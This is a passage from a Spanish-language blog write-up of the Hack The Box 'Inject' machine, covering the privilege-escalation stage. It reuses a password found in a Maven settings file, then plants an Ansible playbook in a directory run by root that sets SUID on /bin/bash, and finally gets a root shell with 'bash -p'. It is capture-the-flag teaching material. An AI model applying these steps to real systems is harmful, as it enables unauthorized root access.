</span></span><span class="line"><span class="cl">      <span class="nt">&lt;password&gt;</span>DocPhillovestoInject123<span class="nt">&lt;/password&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;privateKey&gt;</span>${user.home}/.ssh/id_dsa<span class="nt">&lt;/privateKey&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;filePermissions&gt;</span>660<span class="nt">&lt;/filePermissions&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;directoryPermissions&gt;</span>660<span class="nt">&lt;/directoryPermissions&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;configuration&gt;&lt;/configuration&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/server&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/servers&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/settings&gt;</span>
</span></span></code></pre></div><p>Me conecto como <strong>phil</strong>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">frank@inject:~$ su - phil
</span></span><span class="line"><span class="cl">Password: 
</span></span><span class="line"><span class="cl">phil@inject:~$
</span></span></code></pre></div><p>lanzo <strong>pspy</strong> y veo que <strong>root</strong> ejecuta con <code>ansible-parallel</code> todos los archivos <code>.yml</code> en <code>/opt/automation/tasks/*</code>.</p>
<pre tabindex="0"><code>UID=0 | /bin/sh -c /usr/local/bin/ansible-parallel /opt/automation/tasks/*.yml
</code></pre><p><strong>Phil</strong> tiene permisos de escritura en el directorio <code>/task</code> porque pertenece al grupo <strong>staff</strong>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">phil@inject:/opt/automation/tasks/$ id 
</span></span><span class="line"><span class="cl">uid=1001(phil) gid=1001(phil) groups=1001(phil),50(staff)
</span></span></code></pre></div><p>Creo el archivo <code>root.yml</code> y lo subo a la m√°quina v√≠ctima.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">phil@inject:/opt/automation/tasks$ touch root.yml
</span></span><span class="line"><span class="cl">phil@inject:/opt/automation/tasks$ ls 
</span></span><span class="line"><span class="cl">root.yml playbook_1.yml
</span></span></code></pre></div><p>Archivo <code>root.yml</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-yml" data-lang="yml"><span class="line"><span class="cl">- <span class="nt">hosts</span><span class="p">:</span><span class="w"> </span><span class="l">localhost</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">gather_facts</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">become</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">tasks</span><span class="p">:</span><span class="w"> </span><span class="l">privesc</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">root</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">command</span><span class="p">:</span><span class="w"> </span><span class="l">chmod u+s /bin/bash</span><span class="w">
</span></span></span></code></pre></div><p>Despu√©s de unos minutos <code>/bin/bash</code> tendr√° permisos <strong>SUID</strong>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">phil@inject:/opt/automation/tasks$ ls -l /bin/bash
</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">1183448</span> Apr <span class="m">18</span>  <span class="m">2022</span> /bin/bash
</span></span></code></pre></div><p>Obtengo el root.</p>
<pre tabindex="0"><code>phil@inject:/opt/automation/tasks$ bash -p
bash-5.0# whoami 
root
</code></pre><p>Y con esto ya tenemos resuelta la m√°quina Inject.</p>
<p>Saludos!</p>

            </div>
        </article></main>
</div>
<footer class="footer">
    <span class="footer_item"> </span>
    &nbsp;

    <div class="footer_social-icons">
<a href="https://github.com/0x-noname" target="_blank" rel="noopener noreferrer me"
    title="Github">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
    stroke-linecap="round" stroke-linejoin="round">
    <path
        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
    </path>
</svg>
</a>
</div>
    <small class="footer_copyright">
        ¬© 2024 .
        
    </small>
</footer><a href="#" title="" id="totop">
    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
</svg>

</a>


    






    
    <script src="https://0x-noname.github.io/js/main.min.35f435a5d8eac613c52daa28d8af544a4512337d3e95236e4a4978417b8dcb2f.js" integrity="sha256-NfQ1pdjqxhPFLaoo2K9USkUSM30&#43;lSNuSkl4QXuNyy8="></script>

    

</body>
</html>
